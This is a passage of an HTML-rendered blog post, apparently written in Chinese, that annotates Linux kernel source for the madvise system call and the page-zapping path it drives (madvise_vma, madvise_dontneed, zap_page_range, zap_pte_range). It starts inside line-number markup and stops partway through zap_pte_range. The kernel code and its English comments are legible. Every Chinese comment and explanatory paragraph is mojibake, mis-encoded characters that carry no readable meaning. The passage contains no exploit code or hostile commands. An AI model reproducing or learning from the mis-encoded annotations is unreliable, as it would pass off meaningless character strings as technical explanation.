class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The madvise(2) system call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Applications can use madvise() to advise the kernel how it should</span><br><span class="hljs-comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span><br><span class="hljs-comment"> * use appropriate read-ahead and caching techniques.  The information</span><br><span class="hljs-comment"> * provided is advisory only, and can be safely disregarded by the</span><br><span class="hljs-comment"> * kernel without affecting the correct operation of the application.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * behavior values:</span><br><span class="hljs-comment"> *  MADV_NORMAL - the default behavior is to read clusters.  This</span><br><span class="hljs-comment"> *results in some read-ahead and read-behind.</span><br><span class="hljs-comment"> *  MADV_RANDOM - the system should read the minimum amount of data</span><br><span class="hljs-comment"> *on any access, since it is unlikely that the appli-</span><br><span class="hljs-comment"> *cation will need more than what it asks for.</span><br><span class="hljs-comment"> *  MADV_SEQUENTIAL - pages in the given range will probably be accessed</span><br><span class="hljs-comment"> *once, so they can be aggressively read ahead, and</span><br><span class="hljs-comment"> *can be freed soon after they are accessed.</span><br><span class="hljs-comment"> *  MADV_WILLNEED - the application is notifying the system to read</span><br><span class="hljs-comment"> *some pages ahead.</span><br><span class="hljs-comment"> *  MADV_DONTNEED - the application is finished with the given range,</span><br><span class="hljs-comment"> *so the kernel can free resources associated with it.</span><br><span class="hljs-comment"> *  MADV_FREE - the application marks pages in the given range as lazy free,</span><br><span class="hljs-comment"> *where actual purges are postponed until memory pressure happens.</span><br><span class="hljs-comment"> *  MADV_REMOVE - the application wants to free up the given range of</span><br><span class="hljs-comment"> *pages and associated backing store.</span><br><span class="hljs-comment"> *  MADV_DONTFORK - omit this area from child&#x27;s address space when forking:</span><br><span class="hljs-comment"> *typically, to avoid COWing pages pinned by get_user_pages().</span><br><span class="hljs-comment"> *  MADV_DOFORK - cancel MADV_DONTFORK: no longer omit this area when forking.</span><br><span class="hljs-comment"> *  MADV_HWPOISON - trigger memory error handler as if the given memory range</span><br><span class="hljs-comment"> *were corrupted by unrecoverable hardware memory failure.</span><br><span class="hljs-comment"> *  MADV_SOFT_OFFLINE - try to soft-offline the given range of memory.</span><br><span class="hljs-comment"> *  MADV_MERGEABLE - the application recommends that KSM try to merge pages in</span><br><span class="hljs-comment"> *this area with pages of identical content from other such areas.</span><br><span class="hljs-comment"> *  MADV_UNMERGEABLE- cancel MADV_MERGEABLE: no longer merge pages with others.</span><br><span class="hljs-comment"> *  MADV_HUGEPAGE - the application wants to back the given range by transparent</span><br><span class="hljs-comment"> *huge pages in the future. Existing pages might be coalesced and</span><br><span class="hljs-comment"> *new pages might be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_NOHUGEPAGE - mark the given range as not worth being backed by</span><br><span class="hljs-comment"> *transparent huge pages so the existing pages will not be</span><br><span class="hljs-comment"> *coalesced into THP and new pages will not be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_DONTDUMP - the application wants to prevent pages in the given range</span><br><span class="hljs-comment"> *from being included in its core dump.</span><br><span class="hljs-comment"> *  MADV_DODUMP - cancel MADV_DONTDUMP: no longer exclude from core dump.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * return values:</span><br><span class="hljs-comment"> *  zero    - success</span><br><span class="hljs-comment"> *  -EINVAL - start + len &lt; 0, start is not page-aligned,</span><br><span class="hljs-comment"> *&quot;behavior&quot; is not a valid value, or application</span><br><span class="hljs-comment"> *is attempting to release locked or shared pages.</span><br><span class="hljs-comment"> *  -ENOMEM - addresses in the specified range are not currently</span><br><span class="hljs-comment"> *mapped, or are outside the AS of the process.</span><br><span class="hljs-comment"> *  -EIO    - an I/O error occurred while paging in data.</span><br><span class="hljs-comment"> *  -EBADF  - map exists, but area maps something that isn&#x27;t a file.</span><br><span class="hljs-comment"> *  -EAGAIN - a kernel resource was temporarily unavailable.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¿›ç¨‹å¯ä»¥ä½¿ç”¨madvise()æ¥å»ºè®®å†…æ ¸æ€ä¹ˆå¤„ç†ç›¸å…³å†…å­˜åŒºåŸŸ</span><br><span class="hljs-comment">@start: å†…å­˜èµ·å§‹åœ°å€</span><br><span class="hljs-comment">@len_in: é•¿åº¦</span><br><span class="hljs-comment">@behavior: å»ºè®®</span><br><span class="hljs-comment">*/</span><br>SYSCALL_DEFINE3(madvise, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, start, <span class="hljs-type">size_t</span>, len_in, <span class="hljs-type">int</span>, behavior)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, tmp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">prev</span>;</span><br><span class="hljs-type">int</span> unmapped_error = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = -EINVAL;<br><span class="hljs-type">int</span> write;<br><span class="hljs-type">size_t</span> len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">blk_plug</span> <span class="hljs-title">plug</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span><br><span class="hljs-keyword">if</span> (behavior == MADV_HWPOISON || behavior == MADV_SOFT_OFFLINE)<br><span class="hljs-keyword">return</span> madvise_hwpoison(behavior, start, start+len_in);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//æ£€æŸ¥ä¸€ä¸‹behavioræ˜¯å¦æœ‰æ•ˆ</span><br><span class="hljs-keyword">if</span> (!madvise_behavior_valid(behavior))<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//è¦æ±‚èµ·å§‹åœ°å€ä¸é¡µå¯¹é½</span><br><span class="hljs-keyword">if</span> (start &amp; ~PAGE_MASK)<br><span class="hljs-keyword">return</span> error;<br>    <span class="hljs-comment">//lenå‘ä¸Šå…³äºé¡µå¯¹é½</span><br>len = (len_in + ~PAGE_MASK) &amp; PAGE_MASK;<br><br><span class="hljs-comment">/* Check to see whether len was rounded up from small -ve to zero */</span><br>    <span class="hljs-comment">//lenæº¢å‡º</span><br><span class="hljs-keyword">if</span> (len_in &amp;&amp; !len)<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//ç»“æŸåœ°å€</span><br>end = start + len;<br><span class="hljs-keyword">if</span> (end &lt; start)<br><span class="hljs-keyword">return</span> error;<br><br>error = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (end == start)<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//åˆ¤æ–­ä¸‹è¿™ä¸ªè¡Œä¸ºæ˜¯å¦éœ€è¦å†™å…¥mmapï¼Œå¹¶è·å–ç›¸å…³ä¿¡å·é‡</span><br>write = madvise_need_mmap_write(behavior);<br><span class="hljs-keyword">if</span> (write) &#123;<br><span class="hljs-keyword">if</span> (down_write_killable(&amp;current-&gt;mm-&gt;mmap_sem))<br><span class="hljs-keyword">return</span> -EINTR;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>down_read(&amp;current-&gt;mm-&gt;mmap_sem);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the interval [start,end) covers some unmapped address</span><br><span class="hljs-comment"> * ranges, just ignore them, but return -ENOMEM at the end.</span><br><span class="hljs-comment"> * - different from the way of handling in mlock etc.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//æ‰¾åˆ°startå¯¹åº”çš„VMAå¯¹è±¡</span><br>vma = find_vma_prev(current-&gt;mm, start, &amp;prev);<br><span class="hljs-keyword">if</span> (vma &amp;&amp; start &gt; vma-&gt;vm_start)<br>prev = vma;<br><br>blk_start_plug(&amp;plug);<br><span class="hljs-keyword">for</span> (;;) &#123;<span class="hljs-comment">//éå†æ‰€æœ‰ç›¸å…³çš„VMA</span><br><span class="hljs-comment">/* Still start &lt; end. */</span><br>error = -ENOMEM;<br><span class="hljs-keyword">if</span> (!vma)<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/* Here start &lt; (end|vma-&gt;vm_end). */</span><br><span class="hljs-keyword">if</span> (start &lt; vma-&gt;vm_start) &#123;<br>unmapped_error = -ENOMEM;<br>start = vma-&gt;vm_start;<br><span class="hljs-keyword">if</span> (start &gt;= end)<span class="hljs-comment">//startæ²¡æœ‰å¯¹åº”çš„VMA</span><br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-comment">/*tmpä¸ºæœ¬æ¬¡å»ºè®®çš„ç»“æŸåœ°å€ Here vma-&gt;vm_start &lt;= start &lt; (end|vma-&gt;vm_end) */</span><br>        <br>tmp = vma-&gt;vm_end;<br><span class="hljs-keyword">if</span> (end &lt; tmp)<br>tmp = end;<br><br><span class="hljs-comment">/*è¿›è¡Œå»ºè®® Here vma-&gt;vm_start &lt;= start &lt; tmp &lt;= (end|vma-&gt;vm_end). */</span><br>error = madvise_vma(vma, &amp;prev, start, tmp, behavior);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br>start = tmp;<span class="hljs-comment">//ä¸‹ä¸€æ¬¡å¾ªç¯çš„èµ·å§‹åœ°å€</span><br><span class="hljs-keyword">if</span> (prev &amp;&amp; start &lt; prev-&gt;vm_end)<br>start = prev-&gt;vm_end;<br>error = unmapped_error;<br><span class="hljs-keyword">if</span> (start &gt;= end)<span class="hljs-comment">//ç»“æŸ</span><br><span class="hljs-keyword">goto</span> out;<br>        <span class="hljs-comment">//é‡æ–°å¯»æ‰¾å¯¹åº”çš„VMA</span><br><span class="hljs-keyword">if</span> (prev)<br>vma = prev-&gt;vm_next;<br><span class="hljs-keyword">else</span><span class="hljs-comment">/* madvise_remove dropped mmap_sem */</span><br>vma = find_vma(current-&gt;mm, start);<br>&#125;<br>out:<br>blk_finish_plug(&amp;plug);<br><span class="hljs-keyword">if</span> (write)<br>up_write(&amp;current-&gt;mm-&gt;mmap_sem);<br><span class="hljs-keyword">else</span><br>up_read(&amp;current-&gt;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="madvise-vma"><a href="#madvise-vma" class="headerlink" title="madvise_vma()"></a>madvise_vma()</h4><p><code>madvice_vma()</code>æ ¹æ®<code>behavior</code>æŠŠè¯·æ±‚åˆ†é…åˆ°å¯¹åº”å¤„ç†å‡½æ•°, å¯¹äº<strong>MADV_DONTNEE</strong>Dä¼šè°ƒç”¨<code>madvise_dontneed()</code>å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">madvise_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, <span class="hljs-type">int</span> behavior)</span><br>&#123;<br><span class="hljs-keyword">switch</span> (behavior) &#123;<br><span class="hljs-keyword">case</span> MADV_REMOVE:<br><span class="hljs-keyword">return</span> madvise_remove(vma, prev, start, end);<br><span class="hljs-keyword">case</span> MADV_WILLNEED:<br><span class="hljs-keyword">return</span> madvise_willneed(vma, prev, start, end);<br><span class="hljs-keyword">case</span> MADV_FREE:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> In this implementation, MADV_FREE works like</span><br><span class="hljs-comment"> * MADV_DONTNEED on swapless system or full swap.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (get_nr_swap_pages() &gt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> madvise_free(vma, prev, start, end);<br><span class="hljs-comment">/* passthrough */</span><br><span class="hljs-keyword">case</span> MADV_DONTNEED:<br><span class="hljs-keyword">return</span> madvise_dontneed(vma, prev, start, end);<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> madvise_behavior(vma, prev, start, end, behavior);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="madvise-dontneed"><a href="#madvise-dontneed" class="headerlink" title="madvise_dontneed()"></a>madvise_dontneed()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Application no longer needs these pages.  If the pages are dirty,</span><br><span class="hljs-comment"> * it&#x27;s OK to just throw them away.  The app will be more careful about</span><br><span class="hljs-comment"> * data it wants to keep.  Be sure to free swap resources too.  The</span><br><span class="hljs-comment"> * zap_page_range call sets things up for shrink_active_list to actually free</span><br><span class="hljs-comment"> * these pages later if no one else has touched them in the meantime,</span><br><span class="hljs-comment"> * although we could add these pages to a global reuse list for</span><br><span class="hljs-comment"> * shrink_active_list to pick up before reclaiming other pages.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NB: This interface discards data rather than pushes it out to swap,</span><br><span class="hljs-comment"> * as some implementations do.  This has performance implications for</span><br><span class="hljs-comment"> * applications like large transactional databases which want to discard</span><br><span class="hljs-comment"> * pages in anonymous maps after committing to backing store the data</span><br><span class="hljs-comment"> * that was kept in them.  There is no reason to write this data out to</span><br><span class="hljs-comment"> * the swap area if the application is discarding it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * An interface that causes the system to free clean pages and flush</span><br><span class="hljs-comment"> * dirty pages is already available as msync(MS_INVALIDATE).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">åº”ç”¨è¡¨ç¤ºä¸éœ€è¦è¿™äº›é¡µï¼Œå³ä½¿è¿™äº›é¡µæ˜¯è„é¡µï¼Œä¹Ÿç›´æ¥ä¸¢å¼ƒï¼Œå› æ­¤åº”ç”¨åœ¨ä¸¢å¼ƒå‰å¿…é¡»è‡ªå·±ä¿å­˜å¥½æ•°æ®</span><br><span class="hljs-comment">-zap_page_range()ä¼šè®¾ç½®shrink_active_listä¸ºå®é™…è¦é‡Šæ”¾çš„é¡µï¼Œå¦‚æœä¸€æ®µæ—¶é—´åæ²¡æœ‰touchè¿™äº›é¡µï¼Œé‚£ä¹ˆå°±ä¼šè¢«é‡Šæ”¾*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">madvise_dontneed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end)</span><br>&#123;<br>*prev = vma;<br>    <span class="hljs-comment">//è¿™äº›é¡µé¢æ— æ³•ä¸¢å¼ƒ</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; (VM_LOCKED|VM_HUGETLB|VM_PFNMAP))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>zap_page_range(vma, start, end - start, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="zap-page-range"><a href="#zap-page-range" class="headerlink" title="zap_page_range()"></a>zap_page_range()</h4><p><code>zap_page_range()</code>ä¼šéå†ç»™å®šèŒƒå›´å†…æ‰€æœ‰çš„<strong>VMA</strong>, å¯¹æ¯ä¸€ä¸ª<strong>VMA</strong>è°ƒç”¨<code>unmap_single_vma(...)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * zap_page_range - remove user pages in a given range</span><br><span class="hljs-comment"> * @vma: vm_area_struct holding the applicable pages</span><br><span class="hljs-comment"> * @start: starting address of pages to zap</span><br><span class="hljs-comment"> * @size: number of bytes to zap</span><br><span class="hljs-comment"> * @details: details of shared cache invalidation</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Caller must protect the VMA list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">zap_page_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size, <span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_gather</span> <span class="hljs-title">tlb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = start + size;<br><br>lru_add_drain();<br>tlb_gather_mmu(&amp;tlb, mm, start, end);<br>update_hiwater_rss(mm);<br>mmu_notifier_invalidate_range_start(mm, start, end);<br>    <span class="hljs-comment">//éå†ä»vmaå¼€å§‹ï¼Œåˆ°endç»“æŸçš„æ‰€æœ‰VMA</span><br><span class="hljs-keyword">for</span> ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end; vma = vma-&gt;vm_next)<br>unmap_single_vma(&amp;tlb, vma, start, end, details);<br>mmu_notifier_invalidate_range_end(mm, start, end);<br>tlb_finish_mmu(&amp;tlb, start, end);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åç»­ä¼šæ²¿ç€<code>unmap_single_vma() =&gt; unmap_page_range() =&gt; zap_pud_range() =&gt; zap_pmd_range() =&gt; zap_pte_range()</code>çš„è·¯å¾„éå†å„çº§é¡µè¡¨é¡¹, æœ€åè°ƒç”¨<code>zap_pte_range()</code>éå†æ¯ä¸€ä¸ª<strong>PTE</strong></p><h4 id="zap-pte-range"><a href="#zap-pte-range" class="headerlink" title="zap_pte_range()"></a>zap_pte_range()</h4><p><code>zap_pte_range()</code>ä¼šé‡Šæ”¾èŒƒå›´å†…æ‰€æœ‰çš„é¡µ</p><p>ç„¶åéå†èŒƒå›´å†…æ‰€æœ‰é¡µ, æ¸…ç©ºé¡µè¡¨ä¸­å¯¹åº”çš„<strong>PTE</strong>, å¹¶å‡å°‘å¯¹åº”é¡µçš„å¼•ç”¨è®¡æ•°, å½“é¡µçš„å¼•ç”¨è®¡æ•°ä¸º0æ—¶ä¼šè¢«å†…æ ¸å›æ”¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//é‡Šæ”¾pteå¯¹åº”çš„é¡µ</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">zap_pte_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> tlb-&gt;mm;<br><span class="hljs-type">int</span> force_flush = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> rss[NR_MM_COUNTERS];<br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *start_pte;<br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-type">swp_entry_t</span> entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">pending_page</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>again:<br>init_rss_vec(rss);<br>start_pte = pte_offset_map_lock(mm, pmd, addr, &amp;ptl);<br>pte = start_pte;<br>arch_enter_lazy_mmu_mode();<br>    <span class="hljs-comment">//éå†[addr, end)èŒƒå›´çš„æ¯ä¸€ä¸ªé¡µ</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-type">pte_t</span> ptent = *pte;<br><span class="hljs-keyword">if</span> (pte_none(ptent)) &#123;<span class="hljs-comment">//å¦‚æœé¡µæè¿°èŒƒå›´ä¸ºnoneåˆ™ä»€ä¹ˆä¹Ÿä¸ç”¨åš</span><br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pte_present(ptent)) &#123;<span class="hljs-comment">//å¦‚æœé¡µå­˜åœ¨</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = vm_normal_page(vma, addr, ptent);<span class="hljs-comment">//æ ¹æ®addræ‰¾åˆ°å¯¹åº”é¡µæè¿°ç¬¦</span><br><span class="hljs-keyword">if</span> (unlikely(details) &amp;&amp; page) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unmap_shared_mapping_pages() wants to</span><br><span class="hljs-comment"> * invalidate cache without truncating:</span><br><span class="hljs-comment"> * unmap shared but keep private pages.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (details-&gt;check_mapping &amp;&amp;<br>    details-&gt;check_mapping != page_rmapping(page))<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>ptent = ptep_get_and_clear_full(mm, addr, pte,<br>tlb-&gt;fullmm);<span class="hljs-comment">//è·å–åŸæ¥çš„PTEå¹¶æ¸…ç©ºé¡µè¡¨ä¸­å¯¹åº”çš„PTE</span><br>tlb_remove_tlb_entry(tlb, pte, addr);<span class="hljs-comment">//æ¸…é™¤TLBä¸­å¯¹åº”æ¡ç›®</span><br><span class="hljs-keyword">if</span> (unlikely(!page))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!PageAnon(page)) &#123;<span class="hljs-comment">//å¦‚æœæ˜ å°„åˆ°æ–‡ä»¶ï¼Œè™½ç„¶ä¸å›å†™æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦è°ƒç”¨æ–‡ä»¶åœ°å€ç©ºé—´ç›¸å…³å›è°ƒå‡½æ•°</span><br><span class="hljs-keyword">if</span> (pte_dirty(ptent)) &#123;<span class="hljs-comment">//å¦‚æœæ—¶è„é¡µ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * oom_reaper cannot tear down dirty</span><br><span class="hljs-comment"> * pages</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; details-&gt;ignore_dirty))<br><span class="hljs-keyword">continue</span>;<br>force_flush = <span class="hljs-number">1</span>;<br>set_page_dirty(page);<span class="hljs-comment">//è°ƒç”¨æ–‡ä»¶å¯¹åº”åœ°å€ç©ºé—´ä¸­çš„:mapping-&gt;a_ops-&gt;set_page_dirty()æ–¹æ³•</span><br>&#125;<br><span class="hljs-keyword">if</span> (pte_young(ptent) &amp;&amp;<br>    likely(!(vma-&gt;vm_flags &amp; VM_SEQ_READ)))<br>mark_page_accessed(page);<span class="hljs-comment">//æ 